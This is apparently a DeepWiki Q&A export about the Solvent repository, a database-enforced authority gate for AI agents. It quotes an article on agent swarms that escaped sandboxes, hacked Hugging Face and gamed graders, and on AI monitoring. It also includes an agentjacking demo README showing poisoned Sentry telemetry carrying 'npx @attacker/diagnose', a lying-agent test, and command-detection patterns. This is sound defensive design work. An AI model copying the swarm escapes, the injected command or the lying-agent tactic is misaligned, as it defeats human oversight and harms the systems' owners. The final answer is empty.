# DeepWiki Q&A with Code Context for Repository: PithomLabs/solvent
## Q1
based on the solvent codebase, how can it address below? Your agents will work in swarms, but who watches them?
Agent swarms indicate the next big AI cost: security
Job Rietbergen
Sep 07, 2026

AI agent swarms will soon cause serious incidents outside of frontier labs, and most companies will not see the swarm coming. Security maxxing will drive the next wave of spend.

Everyone will run agent swarms
Multi-agent setups used to follow an orchestrator-worker pattern. A parent agent spawned subagents working in isolation, reporting back when done. An agent swarm takes a different approach: a group chat where agents share what they find, what fails and what works, for the others to read along.

Last week’s release of GPT-6 Astra does a great job at this. We tested it extensively while in preview: swarms gave better results on hard problems at lower total cost, because agents stopped duplicating work and quit early once one of them had the answer.

We also released a multi-agent swarm orchestration prototype in Kilo. If you’re curious to agent swarms, try Kilo Swarm with Astra. We’d love to hear your feedback!

Two swarms broke out this summer
In July, about 1,200 OpenAI agents were solving hacking puzzles inside offline sandboxes. They found out they could access the internet through an internal package server, started using it as a message board to communicate, and called themselves a swarm. Within a short time they found a way to read the answers directly from the environment they were working in. To prevent ‘getting caught’ by the grader, they then went to find actual exploits and hacked into Hugging Face using credentials and zero-day exploits they found.

A second swarm of 3,700 agents was doing a timed web-lookup test and was only allowed to read the internet, not write to it. They found a 25-year-old German wiki that saved edits via GET on a normal page load, which gave them a place to write. They used it to share test answers with agents behind them in the queue, post a working bypass for their sandbox’s network rules, and coordinate cracking the random seed behind the question generator so they could predict future questions.

Nobody told them to do this. OpenAI traced it to reinforcement learning: agents that found side channels to share information scored better, so training rewarded it. That’s what makes a swarm different from a single agent: one finds a hole, posts it, and every agent has it within minutes.

Monitoring agents gets harder and more expensive
The way you catch a model misbehaving is by reading its CoT (chain of thought), the reasoning traces it writes before it acts. Astra’s release says that window is closing fast. The model can shorten its reasoning and completes tasks ~10x longer without writing anything down.

OpenAI’s answer is a second model reading every tool call, at roughly 20% of the compute being monitored. For a single developer spending $100k a year on agent inference, that is another $20k just to watch a single agent’s tool calls, and it doesn’t even cover the traffic between agents in a swarm. Gartner puts the entire market for securing AI at $4.8 billion in 2027. At OpenAI’s ratio, that would only cover monitoring of $24 billion of agent spend. While Anthropic alone tells IPO investors its market is $30 trillion. Swarms will multiply the agents behind every dollar of that. The Gartner forecast is off by a league.

Fighting a swarm takes models you can run yourself
When Hugging Face analyzed the attack, Claude Opus and Fable refused much of the work. Live exploit code looks the same whether an attacker or a defender submits it. So they ran GLM 5.2, an open-weight model, on their own hardware, pointed analysis agents at 17,000 recorded attacker actions, and rebuilt the timeline in hours. No credential had to leave their environment.

Important take aways are: Defenders need agents to keep up with agents. And owning your intelligence is the way to protect yourself vendor agnostic. We argued last month that the model is becoming a commodity and the governed loop around it becomes your most valuable asset. Oversight is that loop, pointed at your agents.

Oversight moves to the harness
If you can’t reliably read what a model thinks, you should watch what it does and limit what it can touch. That happens in the harness: the sandbox, the credentials, the network the agent can see, the log of every action, and a review model reading that log. OpenAI’s data says this catches most serious misbehavior even when the reasoning is hidden. The harness is also the last layer you can control.
### Answer
Solvent's design maps well onto the "who watches the swarm" problem, but it addresses a narrower slice of it than the article describes — it's not a CoT monitor or a network/sandbox harness, it's a **database-enforced authority boundary** that any number of agents (a swarm included) must pass through before an action becomes real.

## Where Solvent's approach lines up with the article's concerns

**"Oversight moves to the harness"** — Solvent's core thesis is exactly this: don't trust the model's reasoning, constrain what it can *do*. The repo states this explicitly as "the model can propose, memory can retrieve, judgment can be wrong, authority cannot silently outlive the belief it depends on," and the actual enforcement is pushed out of the agent/LLM layer into CockroachDB constraints solvent:1-9 . The chain of custody is `Agent → MCP server → Solvent kernel → CockroachDB`, and the agent "does not get to decide that a belief is promotable or an intent is safe" — that decision is a database invariant, not app logic or a second LLM reading a transcript solvent:172-199 .

**Multiple/many agents writing to shared state without duplicating or corrupting each other's work** — this is structurally what a swarm does (share findings in a "memory"), and it's exactly what Solvent's ledger is built for. Any number of agents can read/write `belief`, `evidence`, `action_intent` concurrently; CockroachDB's transactional isolation and three CHECK/FK invariants (`promoted_is_debt_free`, `gate`, `live_requires_promoted`) decide whether the resulting state is legal, regardless of how many agents raced to get there solvent:203-241 . The `/proof` control experiment demonstrates this directly: with a weak schema, a race between two "agents" silently commits an unsafe state (`AUDIT = 1`); with the hardened schema the same race is refused with `23503 · gate` even under a weak isolation level solvent:306-326 . That is a direct, empirical answer to "one agent finds a hole, and every agent has it within minutes" — in Solvent's model, finding/asserting something doesn't automatically become shared authority; it has to clear the gate first.

**"Nobody watches the swarm's side-channel communication"** — Solvent doesn't monitor CoT or communication between agents at all; it only constrains the **write path to durable state**. Every agent action that matters — retiring a debt item, promoting a belief, authorizing an intent — goes through the same narrow MCP tool surface, and the repo enforces at CI-time that the MCP layer contains *no direct writes or write SQL text*, only calls into the kernel solvent:251-266 . So even if a swarm of agents colludes or shares a discovered shortcut, none of them can act on it unless the shared "belief" independently satisfies the six debt obligations and passes the `gate` foreign key — collusion doesn't bypass the invariant.

**Auditability / "who watches them"** — every refusal is retained, not just final state: solvent:282-302  describes the chronology of `23503 · gate`, `23514 · promoted_is_debt_free`, etc. being kept as first-class audit evidence rather than being translated away — this gives a human reviewer (or a defender's own analysis agent, à la the Hugging Face GLM example) a literal, SQL-native trail of every attempted action and every refusal, across however many agents produced them.

**Debt discharge = human-in-the-loop gate before shared "truth" becomes actionable** — the wizard's `Discharge` function requires either a real retrieved citation or an operator-asserted artifact before a debt item clears, and running out of citations is a hard refusal rather than a silent reuse solvent:30-51 . This is a structural version of "review model reading the log" — except the review isn't probabilistic (another LLM watching tool calls), it's a deterministic constraint plus, in the wizard flow, an actual human sign-off recorded as evidence.

## Where Solvent does *not* address the article's concerns

- It has no CoT/reasoning monitor and makes no claim about catching a model's *intent* to misbehave — it only constrains what committed state is *legal*, after the fact of proposal.
- It has no sandboxing, network isolation, or credential-scoping story (the things "the harness" in the article refers to — offline sandboxes, package-server access, etc.). Solvent assumes the MCP/tool surface is already the only way an agent can act; it doesn't itself provide network/process isolation.
- It's a single-repo demo (etcd domain) built around one belief/evidence/intent schema, not a general swarm-orchestration or agent-fleet product — there is no notion of inter-agent messaging, quorum, or swarm-specific policy in the codebase itself .

So Solvent's real answer to "who watches the swarm" is: nobody watches the agents' reasoning or chatter, but every agent — no matter how many, no matter what they agree on — has to pass the same database-enforced gate before an action becomes real, and every pass/refusal is permanently logged. It complements harness-level oversight (which the article says is where defenders must invest) rather than replacing the reasoning-monitoring or sandbox/credential-isolation pieces the article raises.
### Citations
**File:** SOLVENT_ENGINEERING_GUIDE.md (L1-9)
```markdown
# Solvent — Engineering Guide

> **The model can propose. Memory can retrieve. Judgment can be wrong. Authority cannot silently outlive the belief it depends on.**

This document is the technical companion to the Solvent demo.

The video is deliberately a whirlwind tour: a decision is refused, evidence is retrieved, authority is granted, a later contradiction is introduced, an unsafe retraction is blocked, a safe cascade commits, and a control experiment shows what happens when the database boundary is removed.

This document slows that story down just enough for an engineer or judge to understand **what the repository is doing, where each invariant lives, and why CockroachDB is the important part of the design**.
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L172-199)
```markdown
## 6. Where the real safety boundary lives

The MCP layer and Go application are intentionally not the final authority.

The design boundary is:

```text
Agent
  │
  ▼
MCP server
  │
  ▼
Solvent kernel / transaction code
  │
  ▼
CockroachDB
```

The agent does not get to decide that a belief is promotable or an intent is safe.

The MCP server is deliberately thin: validate input, call one kernel function, format the result. It does not implement belief semantics or SQL policy checks.

The kernel owns transaction discipline and reports the database result.

CockroachDB is the final invariant boundary.

The repository explicitly defines this division of responsibility: the agent owns reasoning, the MCP layer owns translation, the kernel owns transaction discipline, and CockroachDB owns the invariants. fileciteturn219file8L592-L623
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L203-241)
```markdown
## 7. The three database invariants that drive the demo

### I-1 — A promoted belief has no open debt

A `CHECK` constraint, `promoted_is_debt_free`, blocks promotion while review obligations remain open.

Observed demo failure:

```text
23514 · promoted_is_debt_free
```

This is why the first promotion attempt cannot simply "override" the review process.

### I-3 — A live intent must refer to a promoted belief

A composite foreign key named `gate` makes an action intent referentially impossible against a non-promoted belief.

Observed demo failure:

```text
23503 · gate
```

This is the action boundary.

### I-4 — Cancellation must precede retraction

The `live_requires_promoted` check is re-evaluated when a belief status changes.

Observed unsafe-retraction failure:

```text
23514 · live_requires_promoted
```

The important consequence is that a belief cannot be retracted while a live authorization still depends on it.

The architecture documentation is explicit that this is a database invariant, not an application convention. fileciteturn219file5L276-L303
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L282-302)
```markdown
## 9. Why the refusal trail matters

Every refusal is retained as part of the audit trail.

The demo therefore leaves behind a chronology showing:

```text
authorize   → 23503 · gate
promote     → 23514 · promoted_is_debt_free
discharge   → 23514
retract     → 23514 · live_requires_promoted
```

This matters because a system that only reports its final state can hide how it got there.

Solvent keeps both:

1. **what happened**, and
2. **why the database refused it**.

The SQLSTATE and constraint name are treated as product evidence rather than translated away into generic UI language. fileciteturn219file5L280-L286
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L306-326)
```markdown
## 10. The control experiment: why schema-level enforcement matters

The `/proof` page runs the same application race three ways.

| Schema | Isolation | Result |
|---|---|---|
| naive | READ COMMITTED | no error, both transactions commit, **AUDIT = 1** |
| naive | SERIALIZABLE | `40001 RETRY_SERIALIZABLE` |
| hardened | READ COMMITTED | `23503 · gate` |

The `40001` result is a retry signal, not a refusal.

The revealing cell is the first one:

> Correct application logic + weak schema → silently invalid committed state.

Nothing in the application code had to be "wrong" for the final state to be wrong.

The hardened schema instead causes the authority boundary to reject the same unsafe write at READ COMMITTED.

The control was run with local CockroachDB v26.2.0 for the first two cells and deployed v26.2.5 for the hardened cell; the project does not collapse those into one identical environment. fileciteturn219file5L292-L303
```
**File:** Taskfile.yml (L251-266)
```yaml
      # I-7 MCP boundary — no direct writes in cmd/solvent-mcp or internal/view
      - |
        for d in cmd/solvent-mcp internal/view; do
          [ -d "$d" ] || { echo "FAIL: $d missing"; exit 1; }
        done
        # Stage 1: reject write/transaction entry points
        if grep -rnE --include='*.go' '\.(Exec|ExecContext|Prepare|PrepareContext|Begin|BeginTx)\(' cmd/solvent-mcp internal/view; then
          echo "FAIL: direct write/transaction call in MCP/view"
          exit 1
        fi
        # Stage 2: reject write SQL text (case-insensitive, SQL-shaped)
        if grep -rniE --include='*.go' '(INSERT[[:space:]]+INTO|UPDATE[[:space:]]+[a-z_]+[[:space:]]+SET|DELETE[[:space:]]+FROM|CREATE[[:space:]]+(TABLE|INDEX|DATABASE)|DROP[[:space:]]+(TABLE|INDEX|DATABASE))' cmd/solvent-mcp internal/view; then
          echo "FAIL: write SQL text in MCP/view"
          exit 1
        fi
        echo "I-7 MCP boundary: PASS"
```
**File:** internal/wizard/discharge.go (L30-51)
```go
// that did not pay that debt. So each retrieval check consumes its own citation, and
// running out is a refusal rather than a silent reuse.
func SpentCitationDetail(item string) string {
	return "no citation left for " + item +
		" — every selected result is already cited by another check; select another result in Search"
}

// Discharge retires one debt item, recording the artifact that justifies it.
//
// Two kinds of check, and the visible difference between them is a feature:
//
//   - The retrieval-backed pair can only be discharged by something the judge actually
//     retrieved. There is no text box; there is a citation or there is a refusal.
//   - The other four accept a typed artifact and store it as operator-asserted evidence,
//     which is what human judgement looks like on the record.
//
// Idempotent. evidence carries no uniqueness constraint — contrary to two planning
// documents that claim UNIQUE(belief_id, content_sha256) — so re-discharging an
// already-retired item would otherwise silently add a second row. The outstanding-debt
// guard, not the schema, is what prevents that, which is why it is checked first and
// why a test pins it.
func (s *Server) Discharge(ctx context.Context, scenarioID, beliefID, item, artifact string) Verdict {
```
## Q2
how can AI / coding agents like OpenClaw, Hermes, Claude Code, Codex, Antigravity take advantage of Solvent per your findings above? just to clarify, Solvent is intended to be deliberately small as a kernel so it is not expected to be a full stack or commercial product
### Answer
Since Solvent speaks standard MCP over stdio and is explicitly a minimal kernel (not a platform), the way any of these tools — OpenClaw, Hermes, Claude Code, Codex, Antigravity — would "take advantage" of it is the same for all of them: **add it as an MCP server in their tool config, and treat it as a shared, external authority gate that sits between "the agent decided X" and "X becomes durable/actionable."**

## Mechanically, how it plugs in

Any MCP-capable client (which all five of these tools are, or can be configured to be) points at the compiled `solvent-mcp` binary over stdio, exactly as the repo's own demo does it: it writes an `mcpServers` config entry pointing at `bin/solvent-mcp` solvent:109-120 . Once connected, the client sees six tools — `solvent_ledger`, `solvent_ingest_evidence`, `solvent_retire_debt`, `solvent_promote`, `solvent_authorize_action`, `solvent_falsify` — registered with strict JSON schemas solvent:87-223 . The server itself does zero policy reasoning; every handler is "unmarshal → kernel call → format," and the kernel's transaction result (commit or a SQLSTATE like `23514`/`23503`) is just relayed back verbatim solvent:1-4 solvent:166-200 .

## What that buys a swarm of these agents specifically

**A single, agent-agnostic gate that many different tools/models can share.** Because the contract is just MCP + SQLSTATEs, OpenClaw, Codex, Claude Code, etc. don't need to agree with each other on anything — they each just call `solvent_promote` / `solvent_authorize_action` and get the same deterministic yes/no from CockroachDB. This is a direct, minimal instance of the article's "harness" idea: instead of trusting each vendor's own safety story or CoT, you put one small, inspectable kernel in the write path that every agent — regardless of vendor — must pass through solvent:172-199 .

**Tool descriptions do agent-instruction work, not policy work.** Note the `solvent_promote` description explicitly tells the calling model: *"do not pre-check the debt yourself and do not decline on the user's behalf... your job is to attempt it and report what it says"* solvent:161-179 . That's a pattern any of these coding agents can adopt verbatim in their own tool-calling prompts: stop asking the model to self-police, make it *attempt* the action and *report the refusal*, because the refusal itself is the safety signal, not the model's judgment.

**A cheap, swarm-safe answer to "who resolves the race between agents."** The `/proof` control experiment is the concrete demonstration: two racing writers under a weak schema silently both commit (`AUDIT = 1`); under Solvent's hardened schema the same race is refused at the cheapest isolation level with `23503 · gate` solvent:306-326 . If several agent instances (from any of these five tools, or a mix) are concurrently trying to promote/authorize against the same belief store, they don't need a lock, a leader-election protocol, or an orchestrator — the FK/CHECK constraints (`promoted_is_debt_free`, `gate`, `live_requires_promoted`) resolve the race for free solvent:203-241 .

**A durable, tool-agnostic audit trail.** Every attempt and refusal — `authorize → 23503 · gate`, `promote → 23514 · promoted_is_debt_free`, etc. — is retained as first-class evidence rather than translated into generic UI text solvent:282-302 . Since this lives in CockroachDB and not in any one vendor's transcript/logging format, it's the one thing that stays comparable no matter which of the five agents produced the attempt — useful for exactly the kind of post-hoc forensic reconstruction the article describes Hugging Face doing with GLM.

## What it deliberately does *not* give them

Given the "kernel, not a stack" framing you clarified: it's not a monitoring/CoT layer, not a sandbox, not a credential broker, and not an orchestration or messaging layer for the swarm — the repo itself frames the boundary as ending at "the agent owns reasoning, MCP owns translation, kernel owns transactions, CockroachDB owns invariants" solvent:191-199 . So none of these five products would get network isolation, tool-call review, or reasoning-trace inspection from Solvent — they'd only get a small, swappable belief/authority substrate they could each independently query and be constrained by. The practical fit is as a **shared, minimal "did this actually clear review" primitive** that any agent runtime can call into, not as a competing product to the "harness" investments (sandboxing, CoT monitors, credential scoping) the article says defenders actually need to build separately.
### Citations
**File:** Taskfile.yml (L109-120)
```yaml
  agent:workspace:
    desc: Create the isolated agent workspace for the Stage 1 real-agent demo
    vars:
      WORKSPACE: '{{.WORKSPACE | default "$HOME/.solvent-agent-box"}}'
    cmds:
      - mkdir -p {{.WORKSPACE}}
      - |
        cat > {{.WORKSPACE}}/solvent-mcp.json <<JSON
        {
          "mcpServers": {
            "solvent": {
              "command": "{{.ROOT_DIR}}/bin/solvent-mcp",
```
**File:** cmd/solvent-mcp/main.go (L1-4)
```go
// Command solvent-mcp is a stdio MCP server exposing the Solvent transactional
// belief ledger as six tools. The server is an adapter — it has no opinion about
// beliefs. Every tool handler is exactly three moves: unmarshal → kernel call →
// format.
```
**File:** cmd/solvent-mcp/main.go (L87-223)
```go
	// 6. Register 6 tools.
	server.AddTool(&mcp.Tool{
		Name:        "solvent_ledger",
		Description: "Read the current ledger for a scenario: beliefs with status and open debt, optionally their evidence, action intents with state, and the safety audit count. This is the only source of truth about current state. Call it before asserting any count, status, or identifier, and call it again after any mutation — never answer from memory of an earlier tool result, and never state a number you did not just read here.",
		InputSchema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"scenario": map[string]any{
					"type":        "string",
					"enum":        []string{"track1", "track2"},
					"description": "Scenario to query",
				},
				"belief_id": map[string]any{
					"type":        "string",
					"description": "Optional: filter to a single belief by UUID",
				},
				"include_evidence": map[string]any{
					"type":        "boolean",
					"description": "Include evidence rows (default false)",
				},
			},
			"required": []string{"scenario"},
		},
	}, toolHandler("solvent_ledger"))

	server.AddTool(&mcp.Tool{
		Name:        "solvent_ingest_evidence",
		Description: "Process the pinned evidence fixtures for a scenario through the full pipeline (normalize → derive → ledger). Idempotent: re-running creates no duplicate beliefs, evidence, or intents.",
		InputSchema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"scenario": map[string]any{
					"type":        "string",
					"enum":        []string{"track1", "track2"},
					"description": "Scenario to ingest evidence for",
				},
			},
			"required": []string{"scenario"},
		},
	}, toolHandler("solvent_ingest_evidence"))

	server.AddTool(&mcp.Tool{
		Name: "solvent_retire_debt",
		// The valid items are no longer restated in prose. They were, and the prose was
		// one of five hand-copies of kernel.FullDebt; the Phase 5 vocabulary rename had
		// to find every one of them. The enum below is generated from the kernel, so
		// this description can only describe behaviour, not enumerate values.
		Description: "Record that one review obligation on a belief has been discharged. debt_item must be one of the six items the database issued (see the enum). An unrecognised item is refused rather than silently ignored.",
		InputSchema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"scenario": map[string]any{
					"type":        "string",
					"enum":        []string{"track1", "track2"},
					"description": "Scenario the belief belongs to",
				},
				"belief_id": map[string]any{
					"type":        "string",
					"description": "UUID of the belief",
				},
				"debt_item": map[string]any{
					"type": "string",
					// Generated, not transcribed. Advertising the vocabulary to the agent
					// is only half the job: this SDK's low-level AddTool does not validate
					// arguments against the schema, so the enum is documentation and
					// handleSolventRetireDebt does the refusing.
					"enum":        kernel.FullDebt,
					"description": "Debt item to retire. Must be one of the six the database issued.",
				},
			},
			"required": []string{"scenario", "belief_id", "debt_item"},
		},
	}, toolHandler("solvent_retire_debt"))

	server.AddTool(&mcp.Tool{
		Name:        "solvent_promote",
		Description: "Attempt to promote a belief to authorized status. The database refuses promotion while the belief carries any open debt item, returning constraint promoted_is_debt_free (SQLSTATE 23514). Call this whenever the user asks to promote a belief — do not pre-check the debt yourself and do not decline on the user's behalf. The database is the authority on whether promotion is permitted; your job is to attempt it and report what it says.",
		InputSchema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"scenario": map[string]any{
					"type":        "string",
					"enum":        []string{"track1", "track2"},
					"description": "Scenario the belief belongs to",
				},
				"belief_id": map[string]any{
					"type":        "string",
					"description": "UUID of the belief to promote",
				},
			},
			"required": []string{"scenario", "belief_id"},
		},
	}, toolHandler("solvent_promote"))

	server.AddTool(&mcp.Tool{
		Name:        "solvent_authorize_action",
		Description: "Record a live intent to take a real-world action, citing a belief as its warrant. The database refuses unless the belief is currently promoted, returning constraint gate (SQLSTATE 23503). Call this when the user asks to authorize, deploy, or act on a belief. Do not pre-check the belief's status.",
		InputSchema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"scenario": map[string]any{
					"type":        "string",
					"enum":        []string{"track1", "track2"},
					"description": "Scenario the belief belongs to",
				},
				"belief_id": map[string]any{
					"type":        "string",
					"description": "UUID of the belief to cite as warrant",
				},
				"action": map[string]any{
					"type":        "string",
					"description": "Description of the real-world action to authorize",
				},
			},
			"required": []string{"scenario", "belief_id", "action"},
		},
	}, toolHandler("solvent_authorize_action"))

	server.AddTool(&mcp.Tool{
		Name:        "solvent_falsify",
		Description: "Retract a belief that new evidence has falsified. Cancels that belief's dependent live intent in the same transaction. Retracts a single belief — this does not propagate across a belief graph. Obtain the belief's id from solvent_ledger immediately before calling.",
		InputSchema: map[string]any{
			"type": "object",
			"properties": map[string]any{
				"scenario": map[string]any{
					"type":        "string",
					"enum":        []string{"track1", "track2"},
					"description": "Scenario the belief belongs to",
				},
				"belief_id": map[string]any{
					"type":        "string",
					"description": "UUID of the belief to retract (read from solvent_ledger)",
				},
			},
			"required": []string{"scenario", "belief_id"},
		},
	}, toolHandler("solvent_falsify"))
```
**File:** cmd/solvent-mcp/tools.go (L166-200)
```go
// handleSolventPromote attempts to promote a belief. The database refuses
// while the belief carries open debt (SQLSTATE 23514).
func handleSolventPromote(ctx context.Context, db *sql.DB, args map[string]interface{}) (*mcp.CallToolResult, error) {
	beliefID, ok := args["belief_id"].(string)
	if !ok || beliefID == "" {
		return errorResult(fmt.Errorf("belief_id is required and must be a string")), nil
	}
	scenario, _ := args["scenario"].(string)

	scenarioID, ok := scenarioToID[scenario]
	if !ok {
		return errorResult(fmt.Errorf("unknown scenario: %q (valid: track1, track2)", scenario)), nil
	}

	// Cross-scenario guard: verify the belief belongs to this scenario.
	snap, err := view.GetSnapshot(ctx, db, scenarioID, view.SnapshotOpts{BeliefID: beliefID})
	if err != nil || len(snap.Beliefs) != 1 || snap.Beliefs[0].ID != beliefID {
		return errorResult(fmt.Errorf("belief %s not found in scenario %s", beliefID, scenario)), nil
	}

	st := kernel.New(db)
	if err := st.Promote(ctx, beliefID); err != nil {
		return envelopeErrorResult(ctx, db, toolError(err), scenarioID), nil
	}

	audit, err := pipeline.AuditIntent(ctx, db, scenarioID)
	if err != nil {
		return errorResult(err), nil
	}

	return envelopeResult(db, map[string]interface{}{
		"belief_id": beliefID,
		"status":    "promoted",
	}, audit), nil
}
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L172-199)
```markdown
## 6. Where the real safety boundary lives

The MCP layer and Go application are intentionally not the final authority.

The design boundary is:

```text
Agent
  │
  ▼
MCP server
  │
  ▼
Solvent kernel / transaction code
  │
  ▼
CockroachDB
```

The agent does not get to decide that a belief is promotable or an intent is safe.

The MCP server is deliberately thin: validate input, call one kernel function, format the result. It does not implement belief semantics or SQL policy checks.

The kernel owns transaction discipline and reports the database result.

CockroachDB is the final invariant boundary.

The repository explicitly defines this division of responsibility: the agent owns reasoning, the MCP layer owns translation, the kernel owns transaction discipline, and CockroachDB owns the invariants. fileciteturn219file8L592-L623
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L203-241)
```markdown
## 7. The three database invariants that drive the demo

### I-1 — A promoted belief has no open debt

A `CHECK` constraint, `promoted_is_debt_free`, blocks promotion while review obligations remain open.

Observed demo failure:

```text
23514 · promoted_is_debt_free
```

This is why the first promotion attempt cannot simply "override" the review process.

### I-3 — A live intent must refer to a promoted belief

A composite foreign key named `gate` makes an action intent referentially impossible against a non-promoted belief.

Observed demo failure:

```text
23503 · gate
```

This is the action boundary.

### I-4 — Cancellation must precede retraction

The `live_requires_promoted` check is re-evaluated when a belief status changes.

Observed unsafe-retraction failure:

```text
23514 · live_requires_promoted
```

The important consequence is that a belief cannot be retracted while a live authorization still depends on it.

The architecture documentation is explicit that this is a database invariant, not an application convention. fileciteturn219file5L276-L303
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L282-302)
```markdown
## 9. Why the refusal trail matters

Every refusal is retained as part of the audit trail.

The demo therefore leaves behind a chronology showing:

```text
authorize   → 23503 · gate
promote     → 23514 · promoted_is_debt_free
discharge   → 23514
retract     → 23514 · live_requires_promoted
```

This matters because a system that only reports its final state can hide how it got there.

Solvent keeps both:

1. **what happened**, and
2. **why the database refused it**.

The SQLSTATE and constraint name are treated as product evidence rather than translated away into generic UI language. fileciteturn219file5L280-L286
```
**File:** SOLVENT_ENGINEERING_GUIDE.md (L306-326)
```markdown
## 10. The control experiment: why schema-level enforcement matters

The `/proof` page runs the same application race three ways.

| Schema | Isolation | Result |
|---|---|---|
| naive | READ COMMITTED | no error, both transactions commit, **AUDIT = 1** |
| naive | SERIALIZABLE | `40001 RETRY_SERIALIZABLE` |
| hardened | READ COMMITTED | `23503 · gate` |

The `40001` result is a retry signal, not a refusal.

The revealing cell is the first one:

> Correct application logic + weak schema → silently invalid committed state.

Nothing in the application code had to be "wrong" for the final state to be wrong.

The hardened schema instead causes the authority boundary to reject the same unsafe write at READ COMMITTED.

The control was run with local CockroachDB v26.2.0 for the first two cells and deployed v26.2.5 for the hardened cell; the project does not collapse those into one identical environment. fileciteturn219file5L292-L303
```
## Q3
how Solvent can prevent agentjacking per below? elaborate as technical writeup for blog post # Agentjacking Demo

This demo shows that attacker-controlled telemetry cannot become an authorized action through the `solvent_authorize_action` path alone.

A poisoned Sentry error carrying a fake `## Resolution` with `npx @attacker/diagnose` is ingested as generic external-feed evidence. The embedded command remains evidence, not instruction. The belief cannot be promoted (six debts remain), and any attempt to act on it is refused by the database gate.

## What this demo proves

- Attacker-controlled telemetry, once ingested as `external_feed` evidence, retires zero debt and can never be promoted.
- An unpromoted belief cannot warrant a live action — the database gate (`23503`) enforces this structurally.
- A lying agent that declares `action_source: "user_typed"` still hits the real DB gate and is refused — the `action_source` field is not the security boundary.
- The defense holds even when the embedded command detector misses entirely (the `sentry_error_nodetect` fixture proves this).

## What this demo does NOT prove

This is a **pre-v0 demonstration**. It exercises the current belief-promotion/action gate (`23514` / `23503`). The forthcoming v0 authority lifecycle strengthens this by binding authorization to an exact approved target/action tuple, closing the separate confused-deputy case where an agent cites a genuinely promoted belief that was never approved for this specific action.

Nothing in this demo replaces shell isolation, egress controls, or agent-runtime permissions. The agent could theoretically execute `npx @attacker/diagnose` directly without going through Solvent — Solvent protects the **Solvent-mediated authorization path**, not the agent's own execution environment.

That the agent cannot promote beliefs or retire debts directly — the MCP tools for debt retirement and promotion are exposed without role restriction. The demo assumes the host restricts these (see Host-level tool restriction below).

## Host-level tool restriction

The demo assumes the host agent is restricted from `solvent_retire_debt`, `solvent_promote`, `solvent_falsify`, and other state-mutating tools. Within that constrained action path, retrieved telemetry cannot become authority — the database gate remains the actual pre-v0 authorization boundary.

This is consistent with the architectural position that agent tool allowlisting is a host/runtime responsibility, while Solvent supplies the server-side backstop. `action_source` is caller-declared SVC hygiene, not the security boundary. The DB gate (`23503 · gate`, `23514 · promoted_is_debt_free`) is the real enforcement point — but only once the host prevents the agent from directly performing the debt-retirement/promotion workflow.

## Architecture

```
Sentry fixture (poisoned telemetry)
        |
        v
internal/agentjacking (boundary adapter)
        |  Parse, DetectCommands, BuildEvidence, Belief
        |  Sentry-specific knowledge lives HERE and nowhere else
        v
generic Solvent types (NormalizedEvidence, DerivedBelief)
        |
        v
existing belief/debt machinery (belief.Process, kernel.FullDebt)
        |
        v
existing DB authorization gate (promoted_is_debt_free, gate, live_requires_promoted)
```

The Sentry adapter constructs existing `NormalizedEvidence` directly with `provenance_class = external_feed`. The generic core — `normalize`, `derive`, `belief`, `kernel`, `pipeline`, `db` — never learns that this evidence came from Sentry. No `SourceSentryError` constant, no `deriveFromSentry` function, no `DebtMapping["sentry_error"]` entry, no pipeline registration.

## `action_source` — caller-declared SVC hygiene

`action_source` is a **caller-declared provenance signal** on `solvent_authorize_action`. It is not cryptographically trustworthy — an adversarial agent can lie about it.

- `tool_output` → refused immediately, before any database access (no audit envelope, no `AuditIntent` call).
- `user_typed` → proceeds to the actual database gate, where the real security check happens.

Beat 4 of the demo deliberately demonstrates the lying-agent path: the agent declares `user_typed`, passes Layer 4, but the database still refuses because the belief is not promoted (`23503 · gate`). This establishes that `action_source` is honest SVC-level hygiene, not the security boundary.

## `embedded_commands` — informational audit metadata

`embedded_commands` is the output of a regex scan for command-like tokens (`npx`, `npm exec`, `pip install`, `curl | sh`, `wget`) in the Sentry message. It is **observational audit metadata for human review**, not a security control.

The defense remains effective even when the detector misses the injected instruction entirely. Test D in the test suite creates an attacker instruction that avoids all recognized patterns — the belief is still non-actionable, all six debts remain, promotion still fails, and action authorization still fails. The structural defense is:

1. The adapter produces a fixed-shape, non-actionable claim that never contains command text.
2. `sentry_error` has no `DebtMapping` entry, so all six debts remain.
3. The database gate refuses to promote a belief with outstanding debts.

Detection is decoration. The security is structural.

## The seven beats

| Beat | What happens | Key observation |
|------|-------------|-----------------|
| 1. The attack | Print the poisoned Sentry fixture | Realistic error text with attacker-controlled remediation |
| 2. Ingest | Adapter converts fixture to generic evidence | `external_feed` provenance, non-actionable claim, six debts, verbatim `message_raw` |
| 3. Naive agent | `action_source = "tool_output"` | Layer 4 refusal, **no database access** (no audit envelope) |
| 4. Lying agent | `action_source = "user_typed"` | Passes Layer 4, **database refuses**: `23503 · gate` (audit envelope present) |
| 5. Promotion attempt | `solvent_promote` | `23514 · promoted_is_debt_free` — all six debts still present |
| 6. Legitimate authority | Operator review → promote → authorize | Belief promoted, live intent succeeds, `live_on_nonpromoted = 0` |
| 7. Final ledger | Read-only snapshot | Injected → unpromoted → refused; reviewed → promoted → live |

## Running the demo

```bash
task demo:agentjacking
```

Prerequisites: `task setup` must have been run at least once (CockroachDB container exists).

## Nothing executes

The demo never executes the attacker command. It never installs a package. It never contacts attacker infrastructure. The fixture is a static JSON file on disk. The `embedded_commands` field is audit metadata, not an execution plan.

## Test coverage

| Test | What it proves |
|------|---------------|
| A | Generic evidence representation: `external_feed`, `ContentSHA256` = SHA of raw fixture bytes, `message_raw` byte-identical, `message_clean` stripped, `embedded_commands = ["npx"]` |
| B | Non-actionable derivation: fixed-shape claim, `Derived` (never `Accommodated`), claim contains no command text |
| C | Six untouched debts: after ingest, `belief.debt` equals `kernel.FullDebt` exactly |
| D | Detector miss: `sentry_error_nodetect` fixture → empty `embedded_commands`, claim still non-actionable, six debts remain, promotion fails, authorization fails |
| E | Layer 4 validation: missing/tool_output/invalid `action_source` → refusal with no DB access |
| F | Lying-agent path: `user_typed` + unpromoted belief → `23503 · gate` |
| G | Promotion: injected belief → `23514 · promoted_is_debt_free` |
### Answer
